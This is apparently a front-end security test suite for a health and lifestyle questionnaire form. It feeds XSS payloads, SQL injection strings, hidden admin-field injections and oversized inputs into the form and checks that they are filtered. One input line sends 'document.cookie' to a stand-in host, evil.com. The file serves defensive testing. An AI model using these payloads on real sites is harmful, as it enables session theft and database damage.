import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { BrowserRouter } from 'react-router-dom';
import HealthLifestyle from '../../../components/forms/HealthLifestyle';
import * as authApi from '../../../api/auth';

// Mock the API calls
vi.mock('../../../api/auth', () => ({
  getUserHealth: vi.fn(),
  saveUserHealth: vi.fn(),
  updateUserHealth: vi.fn(),
}));

// Mock react-hot-toast
vi.mock('react-hot-toast', () => ({
  default: {
    success: vi.fn(),
    error: vi.fn(),
  },
}));

const TestWrapper = ({ children }) => (
  <BrowserRouter>{children}</BrowserRouter>
);

describe('HealthLifestyle Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    authApi.getUserHealth.mockResolvedValue({ data: {} });
  });

  describe('XSS Prevention in Health Data', () => {
    it('should prevent XSS in medical history details textarea', async () => {
      const xssPayloads = [
        '<script>alert("Medical XSS")</script>',
        'javascript:void(0)//Heart condition',
        '<img src=x onerror=alert("Health hack")>',
        '"><svg/onload=alert(/XSS/)>Diabetes',
        '<iframe src="javascript:alert(1)">Blood pressure</iframe>',
        'data:text/html,<script>alert("Medical")</script>',
        '<object data="javascript:alert(1)">Medication</object>',
        'onmouseover="alert(\'medical\')"',
        '<form><input type="hidden" value="malicious">',
      ];

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // First enable medical history to show textarea
      const medicalHistorySelect = screen.getByDisplayValue('');
      fireEvent.change(medicalHistorySelect, { target: { value: 'yes' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        
        for (const payload of xssPayloads) {
          fireEvent.change(textarea, { target: { value: payload } });
          
          expect(textarea.value).not.toContain('<script>');
          expect(textarea.value).not.toContain('javascript:');
          expect(textarea.value).not.toContain('<img');
          expect(textarea.value).not.toContain('<svg');
          expect(textarea.value).not.toContain('<iframe');
          expect(textarea.value).not.toContain('data:text/html');
          expect(textarea.value).not.toContain('<object');
          expect(textarea.value).not.toContain('onmouseover');
          expect(textarea.value).not.toContain('<form>');
        }
      });
    });

    it('should handle malicious select option injection', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const alcoholSelect = screen.getAllByDisplayValue('')[0]; // First select (alcohol)
      
      // Try to add malicious option via DOM manipulation
      const maliciousOption = document.createElement('option');
      maliciousOption.value = '<script>alert("Alcohol XSS")</script>';
      maliciousOption.textContent = 'Hacked Option';
      alcoholSelect.appendChild(maliciousOption);

      fireEvent.change(alcoholSelect, { target: { value: '<script>alert("Alcohol XSS")</script>' } });
      
      expect(alcoholSelect.value).not.toContain('<script>');
    });
  });

  describe('Sensitive Health Data Protection', () => {
    it('should sanitize HIV status against manipulation', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Find HIV select (by looking for the label)
      const hivLabel = screen.getByText('Have you ever tested HIV positive?');
      const hivSelect = hivLabel.closest('div').querySelector('select');
      
      // Try to add malicious option
      const maliciousOption = document.createElement('option');
      maliciousOption.value = 'yes<script>alert("HIV data leaked")</script>';
      maliciousOption.textContent = 'Compromised';
      hivSelect.appendChild(maliciousOption);

      fireEvent.change(hivSelect, { target: { value: 'yes<script>alert("HIV data leaked")</script>' } });
      
      expect(hivSelect.value).not.toContain('<script>');
    });

    it('should protect TB status from injection attacks', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const tbLabel = screen.getByText('Have you ever tested Tuberculosis (TB) positive?');
      const tbSelect = tbLabel.closest('div').querySelector('select');
      
      const injectionAttempts = [
        'yes"; DROP TABLE health_records; --',
        "no' OR 1=1; --",
        'yes<img src=x onerror=alert("TB")>',
        'javascript:alert("TB status")',
      ];

      for (const attempt of injectionAttempts) {
        fireEvent.change(tbSelect, { target: { value: attempt } });
        
        expect(tbSelect.value).not.toContain('DROP TABLE');
        expect(tbSelect.value).not.toContain('OR 1=1');
        expect(tbSelect.value).not.toContain('<img');
        expect(tbSelect.value).not.toContain('javascript:');
      }
    });

    it('should limit medical history details length to prevent DoS', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const medicalHistorySelect = screen.getByDisplayValue('');
      fireEvent.change(medicalHistorySelect, { target: { value: 'yes' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        
        // Try to input extremely long medical history
        const veryLongHistory = 'A'.repeat(100000);
        fireEvent.change(textarea, { target: { value: veryLongHistory } });
        
        // Should respect maxLength constraint
        expect(textarea.value.length).toBeLessThanOrEqual(500);
      });
    });
  });

  describe('Form Validation Security', () => {
    it('should prevent submission bypass of required fields', async () => {
      const mockSubmit = vi.fn();
      authApi.saveUserHealth.mockResolvedValue({ success: true });

      render(
        <TestWrapper>
          <HealthLifestyle onNext={mockSubmit} />
        </TestWrapper>
      );

      // Try to submit without filling required fields
      const submitButton = screen.getByText('Save & Next');
      fireEvent.click(submitButton);

      // Should not proceed without required fields
      expect(authApi.saveUserHealth).not.toHaveBeenCalled();
    });

    it('should validate medical history details when "yes" is selected', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Fill all required fields except medical history details
      const selects = screen.getAllByDisplayValue('');
      
      fireEvent.change(selects[0], { target: { value: 'no' } }); // alcohol
      fireEvent.change(selects[1], { target: { value: 'no' } }); // tobacco
      fireEvent.change(selects[2], { target: { value: 'no' } }); // tattoos
      fireEvent.change(selects[3], { target: { value: 'no' } }); // HIV
      fireEvent.change(selects[4], { target: { value: 'no' } }); // TB
      fireEvent.change(selects[5], { target: { value: 'yes' } }); // medical history
      fireEvent.change(selects[6], { target: { value: 'vegetarian' } }); // diet

      // Don't fill medical history details
      const submitButton = screen.getByText('Save & Next');
      fireEvent.click(submitButton);

      // Should show validation error for missing details
      await waitFor(() => {
        expect(screen.getByText('Please provide details')).toBeInTheDocument();
      });
    });

    it('should handle form manipulation via hidden fields', async () => {
      const mockSubmit = vi.fn();
      authApi.saveUserHealth.mockImplementation((data) => {
        // Ensure no unauthorized fields are submitted
        expect(data).not.toHaveProperty('isAdmin');
        expect(data).not.toHaveProperty('userId');
        expect(data).not.toHaveProperty('accessLevel');
        return Promise.resolve({ success: true });
      });

      render(
        <TestWrapper>
          <HealthLifestyle onNext={mockSubmit} />
        </TestWrapper>
      );

      // Try to add hidden malicious fields
      const form = document.querySelector('form');
      const hiddenInputs = [
        { name: 'isAdmin', value: 'true' },
        { name: 'userId', value: '1' },
        { name: 'accessLevel', value: 'admin' }
      ];

      hiddenInputs.forEach(({ name, value }) => {
        const hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.name = name;
        hiddenInput.value = value;
        form.appendChild(hiddenInput);
      });

      // Fill required fields properly
      const selects = screen.getAllByDisplayValue('');
      selects.forEach((select, index) => {
        const value = index === 6 ? 'vegetarian' : 'no'; // diet field needs specific value
        fireEvent.change(select, { target: { value } });
      });

      const submitButton = screen.getByText('Save & Next');
      fireEvent.click(submitButton);

      await waitFor(() => {
        expect(authApi.saveUserHealth).toHaveBeenCalled();
      });
    });
  });

  describe('Data Sanitization for API Submission', () => {
    it('should sanitize all data before sending to API', async () => {
      authApi.saveUserHealth.mockImplementation((data) => {
        // Verify all string fields are properly sanitized
        Object.entries(data).forEach(([key, value]) => {
          if (typeof value === 'string') {
            expect(value).not.toContain('<script>');
            expect(value).not.toContain('javascript:');
            expect(value).not.toContain('<img');
            expect(value).not.toContain('data:');
            expect(value).not.toContain('../');
            expect(value).not.toContain('DROP TABLE');
            expect(value).not.toContain('UNION SELECT');
          }
        });
        return Promise.resolve({ success: true });
      });

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Fill form with potentially malicious data
      const selects = screen.getAllByDisplayValue('');
      
      fireEvent.change(selects[0], { target: { value: 'no' } });
      fireEvent.change(selects[1], { target: { value: 'no' } });
      fireEvent.change(selects[2], { target: { value: 'no' } });
      fireEvent.change(selects[3], { target: { value: 'no' } });
      fireEvent.change(selects[4], { target: { value: 'no' } });
      fireEvent.change(selects[5], { target: { value: 'yes' } });
      fireEvent.change(selects[6], { target: { value: 'vegetarian' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        fireEvent.change(textarea, { 
          target: { value: 'Diabetes<script>alert("Medical XSS")</script>' } 
        });

        const submitButton = screen.getByText('Save & Next');
        fireEvent.click(submitButton);
      });

      await waitFor(() => {
        expect(authApi.saveUserHealth).toHaveBeenCalled();
      });
    });

    it('should validate medical condition terms against dangerous patterns', async () => {
      const dangerousMedicalTerms = [
        'Heart condition; DROP TABLE patients; --',
        "Diabetes' OR 1=1; --",
        'Blood pressure<script>window.location="http://evil.com"</script>',
        'Medication<img src=x onerror=fetch("http://evil.com/steal?data="+document.cookie)>',
        'Surgery data:text/html,<script>alert(1)</script>',
      ];

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const medicalHistorySelect = screen.getByDisplayValue('');
      fireEvent.change(medicalHistorySelect, { target: { value: 'yes' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        
        for (const term of dangerousMedicalTerms) {
          fireEvent.change(textarea, { target: { value: term } });
          
          expect(textarea.value).not.toContain('DROP TABLE');
          expect(textarea.value).not.toContain('OR 1=1');
          expect(textarea.value).not.toContain('<script>');
          expect(textarea.value).not.toContain('<img');
          expect(textarea.value).not.toContain('data:text/html');
          // Should preserve medical terms but remove dangerous parts
          if (term.includes('Heart')) expect(textarea.value).toContain('Heart');
          if (term.includes('Diabetes')) expect(textarea.value).toContain('Diabetes');
        }
      });
    });
  });

  describe('Performance and Memory Security', () => {
    it('should handle rapid form submissions without overwhelming system', async () => {
      let submitCount = 0;
      authApi.saveUserHealth.mockImplementation(() => {
        submitCount++;
        return Promise.resolve({ success: true });
      });

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const submitButton = screen.getByText('Save & Next');
      
      // Rapid fire submissions
      for (let i = 0; i < 50; i++) {
        fireEvent.click(submitButton);
      }

      // Should not overwhelm the system with submissions
      await waitFor(() => {
        expect(submitCount).toBeLessThan(50);
      });
    });

    it('should prevent memory exhaustion through large medical history', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const medicalHistorySelect = screen.getByDisplayValue('');
      fireEvent.change(medicalHistorySelect, { target: { value: 'yes' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        
        // Try to create memory pressure with repeated medical history
        let largeHistory = '';
        for (let i = 0; i < 10000; i++) {
          largeHistory += 'Medical condition ' + i + '. ';
        }
        
        fireEvent.change(textarea, { target: { value: largeHistory } });
        
        // Should be limited by maxLength
        expect(textarea.value.length).toBeLessThanOrEqual(500);
        // Component should remain functional
        expect(textarea).toBeInTheDocument();
      });
    });
  });

  describe('Sensitive Medical Data Handling', () => {
    it('should not leak medical status in error messages', async () => {
      authApi.saveUserHealth.mockRejectedValue({
        response: { 
          data: { 
            message: 'Validation failed: HIV status "yes" rejected due to policy violation. User ID: 12345 has been flagged in database table medical_sensitive_data'
          } 
        }
      });

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Fill form with sensitive data
      const selects = screen.getAllByDisplayValue('');
      selects.forEach((select, index) => {
        const value = index === 6 ? 'vegetarian' : 'yes';
        fireEvent.change(select, { target: { value } });
      });

      const submitButton = screen.getByText('Save & Next');
      fireEvent.click(submitButton);

      // Should not expose sensitive medical information in UI
      await waitFor(() => {
        expect(screen.queryByText(/HIV status "yes"/)).not.toBeInTheDocument();
        expect(screen.queryByText(/User ID: 12345/)).not.toBeInTheDocument();
        expect(screen.queryByText(/medical_sensitive_data/)).not.toBeInTheDocument();
      });
    });

    it('should handle medical condition encoding safely', async () => {
      const medicalConditions = [
        'Heart Disease ♥',
        'Diabetes 💉',
        'High Blood Pressure 🩺',
        'Cancer 🎗️',
        'Mental Health 🧠',
        'COVID-19 🦠',
        'HIV/AIDS',
        'Tuberculosis',
        'Addiction Issues 💊',
      ];

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const medicalHistorySelect = screen.getByDisplayValue('');
      fireEvent.change(medicalHistorySelect, { target: { value: 'yes' } });

      await waitFor(() => {
        const textarea = screen.getByPlaceholderText('Please specify in under 100 words');
        
        for (const condition of medicalConditions) {
          fireEvent.change(textarea, { target: { value: condition } });
          
          // Should handle emojis and special characters safely
          expect(textarea).toBeInTheDocument();
          expect(textarea.value).toBeDefined();
        }
      });
    });
  });

  describe('Cross-Field Validation Security', () => {
    it('should prevent inconsistent health data manipulation', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Try to create inconsistent state by manipulating multiple health fields
      const alcoholSelect = screen.getAllByDisplayValue('')[0];
      const tobaccoSelect = screen.getAllByDisplayValue('')[1];
      
      // Set contradictory values
      fireEvent.change(alcoholSelect, { target: { value: 'no' } });
      fireEvent.change(tobaccoSelect, { target: { value: 'yes' } });
      
      // Try to manipulate DOM to show inconsistent state
      Object.defineProperty(alcoholSelect, 'value', { value: 'yes', writable: true });
      
      // Component should maintain its controlled state
      expect(alcoholSelect.value).toBe('no');
    });

    it('should validate diet preferences against manipulation', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const dietSelect = screen.getAllByDisplayValue('')[6]; // Diet is the last select
      
      // Try to add malicious diet option
      const maliciousOption = document.createElement('option');
      maliciousOption.value = 'vegetarian<script>alert("Diet XSS")</script>';
      maliciousOption.textContent = 'Hacked Diet';
      dietSelect.appendChild(maliciousOption);

      fireEvent.change(dietSelect, { target: { value: 'vegetarian<script>alert("Diet XSS")</script>' } });
      
      expect(dietSelect.value).not.toContain('<script>');
    });
  });

  describe('Component Accessibility Security', () => {
    it('should prevent screen reader exploitation through aria labels', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const alcoholLabel = screen.getByText('Do you consume alcohol?');
      const alcoholSelect = alcoholLabel.closest('div').querySelector('select');
      
      // Check that aria attributes cannot be exploited
      expect(alcoholSelect.getAttribute('aria-label')).toBeFalsy();
      
      // Try to add malicious aria attribute
      alcoholSelect.setAttribute('aria-label', 'javascript:alert("Accessibility XSS")');
      
      // Should not execute script through accessibility features
      expect(alcoholSelect.getAttribute('aria-label')).not.toContain('javascript:');
    });

    it('should handle keyboard navigation securely', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const alcoholSelect = screen.getAllByDisplayValue('')[0];
      
      // Test that keyboard events don't trigger unintended actions
      fireEvent.keyDown(alcoholSelect, { key: 'Tab' });
      fireEvent.keyDown(alcoholSelect, { key: 'Enter' });
      fireEvent.keyDown(alcoholSelect, { key: 'Escape' });
      
      // Should not trigger form submission or other unintended actions
      expect(authApi.saveUserHealth).not.toHaveBeenCalled();
    });
  });

  describe('State Management Security', () => {
    it('should prevent direct state manipulation through React DevTools simulation', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const alcoholSelect = screen.getAllByDisplayValue('')[0];
      
      // Simulate malicious state change
      Object.defineProperty(alcoholSelect, 'value', {
        value: 'malicious_value',
        writable: true
      });

      // Normal interaction should override malicious manipulation
      fireEvent.change(alcoholSelect, { target: { value: 'yes' } });
      
      expect(alcoholSelect.value).toBe('yes');
    });

    it('should maintain form integrity during rapid state changes', async () => {
      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      const alcoholSelect = screen.getAllByDisplayValue('')[0];
      const values = ['yes', 'no', 'occasional'];
      
      // Rapidly change values
      for (let i = 0; i < 100; i++) {
        const value = values[i % values.length];
        fireEvent.change(alcoholSelect, { target: { value } });
      }
      
      // Component should remain stable
      expect(alcoholSelect).toBeInTheDocument();
      expect(['yes', 'no', 'occasional']).toContain(alcoholSelect.value);
    });
  });

  describe('Medical Privacy Compliance', () => {
    it('should not expose medical data in console logs', async () => {
      const originalConsoleLog = console.log;
      const logMessages = [];
      console.log = (message) => logMessages.push(message);

      render(
        <TestWrapper>
          <HealthLifestyle />
        </TestWrapper>
      );

      // Fill sensitive medical data
      const hivSelect = screen.getByDisplayValue(''); // Will be one of the selects
      fireEvent.change(hivSelect, { target: { value: 'yes' } });

      // Check that sensitive data is not logged
      const sensitiveTerms = ['HIV', 'positive', 'medical', 'health'];
      logMessages.forEach(message => {
        if (typeof message === 'string') {
          sensitiveTerms.forEach(term => {
            expect(message.toLowerCase()).not.toContain(term.toLowerCase());
          });
        }
      });

      console.log = originalConsoleLog;
    });
  });
});